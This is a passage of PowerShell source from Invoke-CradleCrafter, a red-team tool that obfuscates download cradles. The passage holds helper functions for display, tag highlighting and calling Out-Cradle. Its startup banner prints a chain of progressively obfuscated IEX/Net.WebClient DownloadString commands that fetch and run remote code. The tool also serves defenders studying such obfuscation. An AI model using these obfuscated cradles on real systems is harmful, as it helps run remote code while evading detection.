    Write-Host "`nAnd finally the obligatory `"Don't use this for evil, please`"" -NoNewLine -ForegroundColor Cyan
    Write-Host " :)" -ForegroundColor Green
}


Function Out-ScriptContents
{
<#
.SYNOPSIS

HELPER FUNCTION :: Displays current obfuscated command for Invoke-CradleCrafter.

Invoke-CradleCrafter Function: Out-ScriptContents
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Out-ScriptContents displays current obfuscated command for Invoke-CradleCrafter.

.PARAMETER ScriptContents

Specifies the string containing your cradle.

.PARAMETER PrintWarning

Switch to output redacted form of ScriptContents if they exceed 8,190 characters.

.EXAMPLE

C:\PS> Out-ScriptContents

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [String]
        $ScriptContents,

        [Switch]
        $PrintWarning
    )

    If($ScriptContents.Length -gt $CmdMaxLength)
    {
        # Output ScriptContents, handling if the size of ScriptContents exceeds $CmdMaxLength characters.
        $RedactedPrintLength = $CmdMaxLength/5
        
        # Handle printing redaction message in middle of screen. #OCD
        $CmdLineWidth = (Get-Host).UI.RawUI.BufferSize.Width
        $RedactionMessage = "<REDACTED: ObfuscatedLength = $($ScriptContents.Length)>"
        $CenteredRedactionMessageStartIndex = (($CmdLineWidth-$RedactionMessage.Length)/2) - "[*] ObfuscatedCradle: ".Length
        $CurrentRedactionMessageStartIndex = ($RedactedPrintLength % $CmdLineWidth)
        
        If($CurrentRedactionMessageStartIndex -gt $CenteredRedactionMessageStartIndex)
        {
            $RedactedPrintLength = $RedactedPrintLength-($CurrentRedactionMessageStartIndex-$CenteredRedactionMessageStartIndex)
        }
        Else
        {
            $RedactedPrintLength = $RedactedPrintLength+($CenteredRedactionMessageStartIndex-$CurrentRedactionMessageStartIndex)
        }
    
        Write-Host $ScriptContents.SubString(0,$RedactedPrintLength) -NoNewLine -ForegroundColor Magenta
        Write-Host $RedactionMessage -NoNewLine -ForegroundColor Yellow
        Write-Host $ScriptContents.SubString($ScriptContents.Length-$RedactedPrintLength) -ForegroundColor Magenta
    }
    Else
    {
        Write-Host $ScriptContents -ForegroundColor Magenta
    }

    # Make sure final command doesn't exceed cmd.exe's character limit.
    If($ScriptContents.Length -gt $CmdMaxLength)
    
    {
        # Don't alert on ScriptContent values that have certain launchers applied such that they don't matter the length since they won't be launched on the command line.
        If($PSBoundParameters['PrintWarning'] -AND !($ScriptContents.SubString(0,14).ToLower().StartsWith('sub autoopen()')) -AND !($ScriptContents.SubString(0,9).ToLower().StartsWith('namespace')))
        {
            Write-Host "`nWARNING: This command exceeds the cmd.exe maximum length of $CmdMaxLength." -ForegroundColor Red
            Write-Host "         Its length is" -NoNewLine -ForegroundColor Red
            Write-Host " $($ScriptContents.Length)" -NoNewLine -ForegroundColor Yellow
            Write-Host " characters." -ForegroundColor Red
        }
    }
}          


Function Out-CradleContents
{
<#
.SYNOPSIS

HELPER FUNCTION :: Displays obfuscated cradle returned from Out-Cradle with tags for highlighting all elements of the cradle that were just modified.

Invoke-CradleCrafter Function: Out-CradleContents
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Out-CradleContents displays obfuscated cradle returned from Out-Cradle with tags for highlighting all elements of the cradle that were just modified.

.PARAMETER CradleSyntax

Specifies the string containing your cradle including tags for highlighting portions of the cradle.

.PARAMETER FieldToHighlight

Specifies if all tags should be rendered with their respective colors. If it is defined then all tag formatting will be disregarded except for the selected field (Url, Path, or PostCradleCommand)

.EXAMPLE

C:\PS> Out-CradleContents "Write-Host <<<0'This Is A Different Color'0>>>; Write-Host <<<1'So Is This!'1>>>"

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [String]
        $CradleSyntax,

        [String]
        $FieldToHighlight
    )

    # Set default color schemes for display purposes to make the syntax changes more distinguished for the defender to see.
    # For $TagContentColor: <<<0stuff0>>> will be Yellow, <<<1stuff1>>> will be Cyan, etc.
    $BaseCommandColor = 'White'
    $TagContentColor  = @('Yellow','Cyan')
     
    # If $FieldToHighlight argument was defined then remove all tag formatting except for the selected field (only settable fields: Url or PostCradleCommand).
    # This will only be defined when outputting resultant cradle after Url or PostCradleCommand values are updated.
    If($PSBoundParameters['FieldToHighlight'])
    {
        # Change these field's output color from Cyan to Magenta to match the color scheme of SET output.
        $TagContentColor  = @('Yellow','Magenta')

        # If $FieldToHighlight is 'None' then set base color to Magenta for formatting purposes.
        # This will only be defined when called during Context Shift events.
        If($FieldToHighlight -eq 'None')
        {
            $BaseCommandColor = 'Magenta'
        }

        # Remove all 0-tags (used to define yellow formatting for changes made in last obfuscation update).
        $CradleSyntax = $CradleSyntax.Replace('<<<0','').Replace('0>>>','')

        # Remove all 1-tags for settable fields that are NOT the field defined in $FieldToHighlight argument.
        Switch($FieldToHighlight.ToLower())
        {
            'url' {
                $CradleSyntax = $CradleSyntax.Replace('<<<1','').Replace('1>>>','')
                $CradleSyntax = $CradleSyntax.Replace($Script:Url,('<<<1' + $Script:Url + '1>>>'))
                #If($CradleSyntax.Contains($Script:PostCradleCommand)) {$CradleSyntax = $CradleSyntax.Replace(('<<<1' + $Script:PostCradleCommand + '1>>>'),$Script:PostCradleCommand)}
            }
            'path' {
                $CradleSyntax = $CradleSyntax.Replace('<<<1','').Replace('1>>>','')
                $CradleSyntax = $CradleSyntax.Replace($Script:Path,('<<<1' + $Script:Path + '1>>>'))
                #If($CradleSyntax.Contains($Script:Path)) {$CradleSyntax = $CradleSyntax.Replace(('<<<1' + $Script:Path + '1>>>'),$Script:Path)}
            }
            'postcradlecommand' {
                $CradleSyntax = $CradleSyntax.Replace('<<<1','').Replace('1>>>','')
                If($Script:PostCradleCommand)
                {
                    $CradleSyntax = $CradleSyntax.Replace($Script:PostCradleCommand,('<<<1' + $Script:PostCradleCommand + '1>>>'))
                }
                #If($CradleSyntax.Contains($Script:Url)) {$CradleSyntax = $CradleSyntax.Replace(('<<<1' + $Script:Url + '1>>>'),$Script:Url)}
            }
            'none' {
                $CradleSyntax = $CradleSyntax.Replace('<<<1','').Replace('1>>>','')
            }
            default {Write-Error "An invalid `$FieldToHighlight value ($FieldToHighlight) was passed to switch block."; Exit}
        }
    }
    
    # Additional output options for highlighting certain components of a command that have syntax options available.
    $TagCounter = 0
    $TagOpen  = "<<<"
    $TagClose = ">>>"
    If($CradleSyntax.Contains($TagOpen) -OR $CradleSyntax.Contains($TagClose))
    {
        # $CradleSyntaxOutput is used to test for discrepencies between the raw cradle and the displayed cradle (after all tags have been removed, so what is output to the user).
        $CradleSyntaxOutput = ''
        $CradleSyntaxCopy   = $CradleSyntax
        While($CradleSyntaxCopy.Contains($TagOpen) -OR $CradleSyntaxCopy.Contains($TagClose))
        {
            If(($CradleSyntaxCopy.IndexOf($TagClose) -lt $CradleSyntaxCopy.IndexOf($TagOpen)) -OR (($CradleSyntaxCopy.IndexOf($TagClose) -gt -1) -AND ($CradleSyntaxCopy.IndexOf($TagOpen) -eq -1)))
            {
                # Add implied $TagOpen to current $CradleSyntaxCopy.
                $CradleSyntaxCopy = $TagOpen + $TagCounter + $CradleSyntaxCopy
            }

            $TagOpenIndex     = $CradleSyntaxCopy.IndexOf($TagOpen)
            $TagType          = $CradleSyntaxCopy.SubString($TagOpenIndex+$TagOpen.Length,1)
            $TagOpenWithType  = $TagOpen + $TagType
            $TagCloseWithType = $TagType + $TagClose
            $TagCloseIndex    = $CradleSyntaxCopy.IndexOf($TagCloseWithType)
            $TagContentIndex  = $TagOpenIndex+$TagOpenWithType.Length
            $TagContentLength = $TagCloseIndex-$TagOpenIndex-$TagOpenWithType.Length

            $FirstHalf  = $CradleSyntaxCopy.SubString(0,$TagOpenIndex)
            $TagContent = $CradleSyntaxCopy.SubString($TagContentIndex,$TagContentLength)
            $LastHalf   = $CradleSyntaxCopy.SubString($TagCloseIndex+$TagCloseWithType.Length)

            # Handle 1 layer of embedded tags. This can occur when the All option is passed to Out-Cradle.ps1.
            If($TagContent.Contains($TagOpenWithType))
            {
                $TagContent = $TagContent.SubString(0,$TagContent.IndexOf($TagOpenWithType))

                # Setting $LastHalf back to include $TagContent.
                $LastHalf = $CradleSyntaxCopy.SubString($TagContentIndex)
                $LastHalfIndex = $LastHalf.IndexOf($TagOpenWithType)
                If($LastHalfIndex -gt $LastHalf.Length)
                {
                    $LastHalfIndex = $LastHalf.Length
                }
                $LastHalf = $LastHalf.SubString($LastHalfIndex)
            }
            ElseIf($TagContent.Contains('<<<1'))
            {
                $TagContent = $TagContent.SubString(0,$TagContent.IndexOf('<<<1'))
                $LastHalf   = $CradleSyntaxCopy.SubString($TagContentIndex+$TagContent.Length)
                $LastHalf   = $LastHalf.SubString(0,$LastHalf.IndexOf('1>>>')+4) + $TagOpenWithType + $LastHalf.SubString($LastHalf.IndexOf('1>>>')+4)
            }

            # Output next substring(s) to user with appropriate color.
            Write-Host $FirstHalf  -NoNewLine -ForegroundColor $BaseCommandColor
            Write-Host $TagContent -NoNewLine -ForegroundColor $TagContentColor[$TagType]
            $CradleSyntaxCopy = $LastHalf

            # Add to $CradleSyntaxOutput to perform comparison at end of this function to identify output mismatch between actual cradle syntax.
            $CradleSyntaxOutput += $FirstHalf
            $CradleSyntaxOutput += $TagContent
        }
        Write-Host $LastHalf -ForegroundColor $BaseCommandColor

        # Add to $CradleSyntaxOutput to perform comparison at end of this function to identify output mismatch between actual cradle syntax.
        $CradleSyntaxOutput += $LastHalf

        # Perform comparison to identify output mismatch between actual cradle syntax.
        $CradleSyntaxForComparison = $CradleSyntax.Replace('<<<0','').Replace('0>>>','').Replace('<<<1','').Replace('1>>>','')
        If($CradleSyntaxForComparison -ne $CradleSyntaxOutput)
        {
            Write-Host "`n"
            Write-Host "WARNING: " -NoNewLine -ForegroundColor Yellow
            Write-Host "The result output above does not match the actual cradle result syntax.`n         Error in Out-CradleContents function in Invoke-CradleCrafter.ps1.`n         The result in SHOW OPTIONS, OUT and CLIP are all correct."
        }
    }
    Else
    {
        Write-Host $CradleSyntax -ForegroundColor $BaseCommandColor
    }
}


Function Show-MenuContext
{
<#
.SYNOPSIS

HELPER FUNCTION :: Displays information, behavior and artifacts to provide additional educational context for current cradle type for Invoke-CradleCrafter.

Invoke-CradleCrafter Function: Show-MenuContext
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Show-MenuContext displays information, behavior and artifacts to provide additional educational context for current cradle type for Invoke-CradleCrafter.

.PARAMETER MenuContextVariableName

Specifies the variable containing the information to display for current cradle type. Variables are set in the Invoke-CradleCrafter function and all begin with $MenuContext_.

.EXAMPLE

C:\PS> Show-MenuContext 'MenuContext_Memory_PsWebString'

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [String]
        $MenuContextVariableName
    )

    # Display information about current cradle context.
    If(Test-Path ('Variable:' + $MenuContextVariableName))
    {
        $MenuContextVariable = (Get-Variable $MenuContextVariableName).Value
        ForEach($MenuItem in $MenuContextVariable)
        {
            $MenuItemName  = $MenuItem[0]
            $MenuItemValue = $MenuItem[1]

            # Handle output whether it is a string or an array of strings. This is to clean up the output presentation for multi-line output stored as an array -- because I'm OCD.
            Write-Host ('[*] ' + $MenuItemName + ' :: ') -NoNewLine -ForegroundColor White
            If($MenuItemValue.GetType().Name -eq 'Object[]')
            {                
                Write-Host $MenuItemValue[0] -ForegroundColor Cyan
                For($i=1; $i -lt $MenuItemValue.Count; $i++)
                {
                    Write-Host "                     $($MenuItemValue[$i])" -ForegroundColor Cyan
                }
            }
            Else
            {
                Write-Host $MenuItemValue -ForegroundColor Cyan
            }
        }
    }
    Else
    {
        Write-Error "The variable $MenuContextVariableName does not exist."
        $UserResponse = 'quit'
    }
}


Function Show-AsciiArt
{
<#
.SYNOPSIS

HELPER FUNCTION :: Displays random ASCII art for Invoke-CradleCrafter.

Invoke-CradleCrafter Function: Show-AsciiArt
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Show-AsciiArt displays random ASCII art for Invoke-CradleCrafter, and also displays ASCII art during script startup.

.EXAMPLE

C:\PS> Show-AsciiArt

.NOTES

Credit for ASCII art font generation: http://patorjk.com/software/taag/
This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param (
        [Switch]
        $Random
    )

    # Create ASCII art title banner.
    # ASCII Art Generator: patorjk.com/software/taag/
    # Hammer ASCII Art: http://hammer.ascii.uk/
    $Spacing = "`t"
    $InvokeObfuscationAscii  = @()
    $InvokeObfuscationAscii += $Spacing + "  _____                 _                    ,               "
    $InvokeObfuscationAscii += $Spacing + "  \_   \_ ____   _____ | | _____           /(  __________    "
    $InvokeObfuscationAscii += $Spacing + "   / /\/ '_ \ \ / / _ \| |/ / _ \_____    |  >:==========``   "
    $InvokeObfuscationAscii += $Spacing + "/\/ /_ | | | \ V / (_) |   <  __/_____|    )(                "
    $InvokeObfuscationAscii += $Spacing + "\____/ |_| |_|\_/ \___/|_|\_\___|          `"`"                "
    $InvokeObfuscationAscii += $Spacing + "   ___              _ _        ___           __ _            "
    $InvokeObfuscationAscii += $Spacing + "  / __\ __ __ _  __| | | ___  / __\ __ __ _ / _| |_ ___ _ __ "
    $InvokeObfuscationAscii += $Spacing + " / / | '__/ _`` |/ _`` | |/ _ \/ / | '__/ _`` | |_| __/ _ \ '__|"
    $InvokeObfuscationAscii += $Spacing + "/ /__| | | (_| | (_| | |  __/ /__| | | (_| |  _| ||  __/ |   "
    $InvokeObfuscationAscii += $Spacing + "\____/_|  \__,_|\__,_|_|\___\____/_|  \__,_|_|  \__\___|_|   "

    # Ascii art to run only during script startup.
    If(!$PSBoundParameters['Random'])
    {
        $ArrowAscii  = @()
        $ArrowAscii += '  |  '
        $ArrowAscii += '  |  '
        $ArrowAscii += ' \ / '
        $ArrowAscii += '  V  '
        
        # Show actual obfuscation example (generated with this tool) in reverse.
        $AsciiArtUrl = "http://bit.ly/ASCIIArt"
        Write-Host ""

        $SleepPhase1 = 300

        Write-Host "(New-Object Net.WebClient).DownloadString('" -NoNewline -ForegroundColor White
        Write-Host $AsciiArtUrl -NoNewline -ForegroundColor Cyan
        Write-Host "')" -ForegroundColor White
        
        Start-Sleep -Milliseconds $SleepPhase1; ForEach($Line in $ArrowAscii) {Write-Host $Line}; Start-Sleep -Milliseconds 100

        Write-Host "IEX " -NoNewLine -ForegroundColor Yellow
        Write-Host "(New-Object Net.WebClient).DownloadString('" -NoNewline -ForegroundColor White
        Write-Host $AsciiArtUrl -NoNewline -ForegroundColor Cyan
        Write-Host "')" -ForegroundColor White

        Start-Sleep -Milliseconds $SleepPhase1; ForEach($Line in $ArrowAscii) {Write-Host $Line -NoNewline; Write-Host $Line}; Start-Sleep -Milliseconds 100

        Write-Host "&(GCM *ke-*pr*) " -NoNewLine -ForegroundColor Yellow
        Write-Host "(New-Object Net.WebClient).DownloadString('" -NoNewline -ForegroundColor White
        Write-Host $AsciiArtUrl -NoNewline -ForegroundColor Cyan
        Write-Host "')" -ForegroundColor White

        Start-Sleep -Milliseconds $SleepPhase1; ForEach($Line in $ArrowAscii) {Write-Host $Line -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line}; Start-Sleep -Milliseconds 100

        Write-Host ".(GI Alias:\*EX) " -NoNewLine -ForegroundColor Yellow
        Write-Host "(New-Object Net.WebClient).DownloadString('" -NoNewline -ForegroundColor White
        Write-Host $AsciiArtUrl -NoNewline -ForegroundColor Cyan
        Write-Host "')" -ForegroundColor White

        Start-Sleep -Milliseconds $SleepPhase1; ForEach($Line in $ArrowAscii) {Write-Host (' '*11) -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line}; Start-Sleep -Milliseconds 100
        
        Write-Host ".(-Join(GI env:\C*S*c).Value[4,24,25])" -NoNewLine -ForegroundColor Yellow
        Write-Host "(New-Object Net.WebClient).DownloadString('" -NoNewline -ForegroundColor White
        Write-Host $AsciiArtUrl -NoNewline -ForegroundColor Cyan
        Write-Host "')" -ForegroundColor White

        Start-Sleep -Milliseconds $SleepPhase1; ForEach($Line in $ArrowAscii) {Write-Host (' '*64) -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line}; Start-Sleep -Milliseconds 100
        
        Write-Host ".(-Join(GI env:\C*S*c).Value[4,24,25])(New-Object Net.WebClient)." -NoNewLine -ForegroundColor White
        Write-Host "DownloadString" -NoNewLine -ForegroundColor Yellow
        Write-Host "('" -NoNewline -ForegroundColor White
        Write-Host $AsciiArtUrl -NoNewline -ForegroundColor Cyan
        Write-Host "')" -ForegroundColor White

        $SleepPhase2 = 150
        
        Start-Sleep -Milliseconds $SleepPhase2; ForEach($Line in $ArrowAscii) {Write-Host (' '*64) -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line}; Start-Sleep -Milliseconds 100
        
        Write-Host ".(-Join(GI env:\C*S*c).Value[4,24,25])(New-Object Net.WebClient)." -NoNewLine -ForegroundColor White
        Write-Host "((((New-Object Net.WebClient)|Get-Member)|?{(LS Variable:\_).Value.Name-clike'*wn*g'}).Name).Invoke" -NoNewLine -ForegroundColor Yellow
        Write-Host "('" -NoNewline -ForegroundColor White
        Write-Host $AsciiArtUrl -NoNewline -ForegroundColor Cyan
        Write-Host "')" -ForegroundColor White

        Start-Sleep -Milliseconds $SleepPhase2; ForEach($Line in $ArrowAscii) {Write-Host (' '*39) -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line -NoNewline; Write-Host (' '*20) -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line}; Start-Sleep -Milliseconds 100
        
        Write-Host ".(-Join(GI env:\C*S*c).Value[4,24,25])(" -NoNewLine -ForegroundColor White
        Write-Host "New-Object " -NoNewLine -ForegroundColor Yellow
        Write-Host "Net.WebClient)." -NoNewLine -ForegroundColor White
        Write-Host "((((" -NoNewLine -ForegroundColor White
        Write-Host "New-Object " -NoNewLine -ForegroundColor Yellow
        Write-Host "Net.WebClient)|Get-Member)|?{(LS Variable:\_).Value.Name-clike'*wn*g'}).Name).Invoke" -NoNewLine -ForegroundColor White
        Write-Host "('" -NoNewline -ForegroundColor White
        Write-Host $AsciiArtUrl -NoNewline -ForegroundColor Cyan
        Write-Host "')" -ForegroundColor White

        Start-Sleep -Milliseconds $SleepPhase2; ForEach($Line in $ArrowAscii) {Write-Host (' '*39) -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line -NoNewline; Write-Host (' '*20) -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line}; Start-Sleep -Milliseconds 100
        
        Write-Host ".(-Join(GI env:\C*S*c).Value[4,24,25])(" -NoNewLine -ForegroundColor White
        Write-Host ".(GCM N*ct)" -NoNewLine -ForegroundColor Yellow
        Write-Host "Net.WebClient)." -NoNewLine -ForegroundColor White
        Write-Host "((((" -NoNewLine -ForegroundColor White
        Write-Host ".(GCM N*ct)" -NoNewLine -ForegroundColor Yellow
        Write-Host "Net.WebClient)|Get-Member)|?{(LS Variable:\_).Value.Name-clike'*wn*g'}).Name).Invoke" -NoNewLine -ForegroundColor White
        Write-Host "('" -NoNewline -ForegroundColor White
        Write-Host $AsciiArtUrl -NoNewline -ForegroundColor Cyan
        Write-Host "')" -ForegroundColor White

        Start-Sleep -Milliseconds $SleepPhase2; ForEach($Line in $ArrowAscii) {Write-Host $Line -NoNewline; Write-Host (' '*59) -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line}; Start-Sleep -Milliseconds 100
        
        Write-Host "sl;" -NoNewLine -ForegroundColor Yellow
        Write-Host ".(-Join(GI env:\C*S*c).Value[4,24,25])(" -NoNewLine -ForegroundColor White
        Write-Host ".(Variable E*onte*).Value.InvokeCommand.GetCmdlets('*w-*ct')" -NoNewLine -ForegroundColor Yellow
        Write-Host "Net.WebClient)." -NoNewLine -ForegroundColor White
        Write-Host "((((" -NoNewLine -ForegroundColor White
        Write-Host ".(Variable E*onte*).Value.InvokeCommand.GetCmdlets('*w-*ct')" -NoNewLine -ForegroundColor Yellow
        Write-Host "Net.WebClient)|Get-Member)|?{(LS Variable:\_).Value.Name-clike'*wn*g'}).Name).Invoke" -NoNewLine -ForegroundColor White
        Write-Host "('" -NoNewline -ForegroundColor White
        Write-Host $AsciiArtUrl -NoNewline -ForegroundColor Cyan
        Write-Host "')" -ForegroundColor White

        Start-Sleep -Milliseconds $SleepPhase2; ForEach($Line in $ArrowAscii) {Write-Host $Line -NoNewline; Write-Host (' '*($AsciiArtUrl.Length+3)) -NoNewline; Write-Host $Line -NoNewline; Write-Host (' '*18) -NoNewline; Write-Host $Line}; Start-Sleep -Milliseconds 100
        
        Write-Host '$url=' -NoNewLine -ForegroundColor Yellow
        Write-Host "'" -NoNewLine -ForegroundColor White
        Write-Host $AsciiArtUrl -NoNewline -ForegroundColor Cyan
        Write-Host "';" -NoNewLine -ForegroundColor White
        Write-Host '$wc2=' -NoNewLine -ForegroundColor Yellow
        Write-Host "'Net.WebClient';sl;" -NoNewLine -ForegroundColor White
        Write-Host '$wc=' -NoNewLine -ForegroundColor Yellow
        Write-Host "(.(Variable E*onte*).Value.InvokeCommand.GetCmdlets('*w-*ct')" -NoNewLine -ForegroundColor White
        Write-Host '$wc2' -NoNewLine -ForegroundColor Yellow
        Write-Host ");" -NoNewLine -ForegroundColor White
        Write-Host '$ds=' -NoNewLine -ForegroundColor Yellow
        Write-Host "(((" -NoNewLine -ForegroundColor White
        Write-Host '$wc' -NoNewLine -ForegroundColor Yellow
        Write-Host "|Get-Member)|?{(LS Variable:\_).Value.Name-clike'*wn*g'}).Name);.(Get-Command I*-E*n)" -NoNewLine -ForegroundColor White
        Write-Host '$wc.$ds.Invoke' -NoNewLine -ForegroundColor Yellow
        Write-Host "(" -NoNewLine -ForegroundColor White
        Write-Host '$url' -NoNewLine -ForegroundColor Yellow
        Write-Host ")" -ForegroundColor White

        Start-Sleep -Milliseconds $SleepPhase2; ForEach($Line in $ArrowAscii) {Write-Host $Line -NoNewline; Write-Host (' '*($AsciiArtUrl.Length+5)) -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line -NoNewline; Write-Host (' '*19) -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line}; Start-Sleep -Milliseconds 100
        
        Write-Host 'SV svA ' -NoNewLine -ForegroundColor Yellow
        Write-Host "'" -NoNewLine -ForegroundColor White
        Write-Host $AsciiArtUrl -NoNewline -ForegroundColor Cyan
        Write-Host "';" -NoNewLine -ForegroundColor White
        Write-Host 'SI Variable:\1Q ' -NoNewLine -ForegroundColor Yellow
        Write-Host "'Net.WebClient';sl;" -NoNewLine -ForegroundColor White
        Write-Host 'SI Variable:/I ' -NoNewLine -ForegroundColor Yellow
        Write-Host "(.(Variable E*onte*).Value.InvokeCommand.GetCmdlets('*w-*ct')" -NoNewLine -ForegroundColor White
        Write-Host '(ChildItem Variable:1Q).Value' -NoNewLine -ForegroundColor Yellow
        Write-Host ");" -NoNewLine -ForegroundColor White
        Write-Host 'Set-Item Variable:\b ' -NoNewLine -ForegroundColor Yellow
        Write-Host "(((" -NoNewLine -ForegroundColor White
        Write-Host '(GCI Variable:/I).Value' -NoNewLine -ForegroundColor Yellow
        Write-Host "|Get-Member)|?{(LS Variable:\_).Value.Name-clike'*wn*g'}).Name);.(Get-Command I*-E*n)" -NoNewLine -ForegroundColor White
        Write-Host '(GCI Variable:/I).Value.((Get-Variable b -ValueOnl)).Invoke' -NoNewLine -ForegroundColor Yellow
        Write-Host "(" -NoNewLine -ForegroundColor White
        Write-Host '(Get-Variable svA -Valu)' -NoNewLine -ForegroundColor Yellow
        Write-Host ")" -ForegroundColor White

        Start-Sleep -Milliseconds $SleepPhase2
        Write-Host ""

        # Write out below string in interactive format.
        Start-Sleep -Milliseconds 100
        ForEach($Char in [Char[]]'Invoke-CradleCrafter')
        {
            Start-Sleep -Milliseconds (Get-Random -Input @(25..200))
            Write-Host $Char -NoNewline -ForegroundColor Green
        }
       
        Start-Sleep -Milliseconds 900
        Write-Host "`n"
        
        # Display primary ASCII art title banner.
        $RandomColor = (Get-Random -Input @('Green','Cyan','Yellow'))
        For($i=0; $i -lt $InvokeObfuscationAscii.Count; $i++)
        {
            $Line = $InvokeObfuscationAscii[$i]
            
            # Print the hammer ASCII art in white regardless of the random color for the rest of the title banner ASCII art.
            If($i -lt 5)
            {
                Write-Host $Line.SubString(0,$Spacing.Length+42) -NoNewline -ForegroundColor $RandomColor
                Write-Host $Line.SubString(  $Spacing.Length+42) -ForegroundColor White
            }
            Else
            {
                Write-Host $Line -ForegroundColor $RandomColor
            }
        }
    }
    Else
    {
        # ASCII option in Invoke-CradleCrafter interactive console.
    }

    # Output tool banner after all ASCII art.
    Write-Host ""
    Write-Host "`tTool    :: Invoke-CradleCrafter" -ForegroundColor Magenta
    Write-Host "`tAuthor  :: Daniel Bohannon (DBO)" -ForegroundColor Magenta
    Write-Host "`tTwitter :: @danielhbohannon" -ForegroundColor Magenta
    Write-Host "`tBlog    :: http://danielbohannon.com" -ForegroundColor Magenta
    Write-Host "`tGithub  :: https://github.com/danielbohannon/Invoke-CradleCrafter" -ForegroundColor Magenta
    Write-Host "`tVersion :: 1.1" -ForegroundColor Magenta
    Write-Host "`tLicense :: Apache License, Version 2.0" -ForegroundColor Magenta
    Write-Host "`tNotes   :: If(!`$Caffeinated) {Exit}" -ForegroundColor Magenta
}


Function Invoke-OutCradle
{
<#
.SYNOPSIS

HELPER FUNCTION :: Handles error checking, result de-duplication and token array history maintenance before and after calling Out-Cradle to perform cradle building and obfuscation for Invoke-CradleCrafter.

Invoke-CradleCrafter Function: Invoke-OutCradle
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Invoke-OutCradle handles error checking, result de-duplication and token array history maintenance before and after calling Out-Cradle to perform cradle building and obfuscation for Invoke-CradleCrafter.

.PARAMETER Undo

Specifies if the only change is removing the last layer of changes returned from Out-Cradle.

.EXAMPLE

C:\PS> Invoke-OutCradle

C:\PS> Invoke-OutCradle -Undo

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [Switch]
        $Undo
    )

    # This IF block should never be reached as we perform targeted error handling and messaging in the TEST user input block. Leaving for good measure.
    If(!$Cradle)
    {
        Write-Host "`n`nERROR:" -NoNewLine -ForegroundColor Red
        Write-Host " Cannot perform cradle obfuscation without navigating to a cradle type in the menu.`n       Execute" -NoNewLine
        Write-Host ' TUTORIAL' -NoNewLine -ForegroundColor Yellow
        Write-Host ' for more details.'

        $CradleResultArray = $NULL
    }
    # This block should also never be reached. If a cradle menu is entered without a URL being set then we set the default URL of http://bit.ly/L3g1tCrad1e. Leaving for good measure.
    ElseIf(!$Script:Url)
    {
        Write-Host "`n`nERROR:" -NoNewLine -ForegroundColor Red
        Write-Host " Cannot perform cradle obfuscation without setting Url value in SHOW OPTIONS menu.`n       Set this value by executing" -NoNewLine
        Write-Host ' SET Url http://bit.ly/L3g1tCrad1e' -NoNewLine -ForegroundColor Green
        Write-Host '.'

        $CradleResultArray = $NULL
    }
    Else
    {
        # Cast PostCradleCommand to a ScriptBlock since that is what Out-Cradle is expecting instead of a String.
        $PostCradleCommandScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Script:PostCradleCommand)

        # Call Out-Cradle function with appropriate variables depending on if a PostCradleCommand or Path are specified or not.
        If($PostCradleCommandScriptBlock.StartPosition)
        {
            If($Script:Path.Length -gt 0)
            {
                $CradleResultArray = Out-Cradle -Url $Script:Url -Path $Script:Path -Command $PostCradleCommandScriptBlock -Cradle $Cradle -TokenArray $Script:TokenArray -ReturnAsArray
            }
            Else
            {
                $CradleResultArray = Out-Cradle -Url $Script:Url                    -Command $PostCradleCommandScriptBlock -Cradle $Cradle -TokenArray $Script:TokenArray -ReturnAsArray
            }
        }
        Else
        {
            If($Script:Path.Length -gt 0)
            {
                $CradleResultArray = Out-Cradle -Url $Script:Url -Path $Script:Path                                        -Cradle $Cradle -TokenArray $Script:TokenArray -ReturnAsArray
            }
            Else
            {
                $CradleResultArray = Out-Cradle -Url $Script:Url                                                           -Cradle $Cradle -TokenArray $Script:TokenArray -ReturnAsArray
            }
        }
    }

    # If there are cradle results then set them in appropriate Script-level result variables.
    If($CradleResultArray -AND $Undo)
    {
        # If called from the UNDO command then we don't want to add back to the history arrays.
        # We will only set $Script:ObfuscatedCradle and $Script:ObfuscatedCradleWithTags.
        $Script:ObfuscatedCradle         = $CradleResultArray[0]
        $Script:ObfuscatedCradleWithTags = $CradleResultArray[1]
    }
    ElseIf($CradleResultArray -AND !$Undo)
    {
        $Script:ObfuscatedCradle         = $CradleResultArray[0]
        $Script:ObfuscatedCradleWithTags = $CradleResultArray[1]

        # Add in all returned tokens into $Script:TokenArray replacing any duplicate token value names with these recently-returned values.
        $TokensUpdatedThisIteration = $CradleResultArray[2]

        # Get array of value names that were returned from Out-Cradle via $TokensUpdatedThisIteration.
        $TokenArrayNames = $TokensUpdatedThisIteration | ForEach-Object {$_[0]}

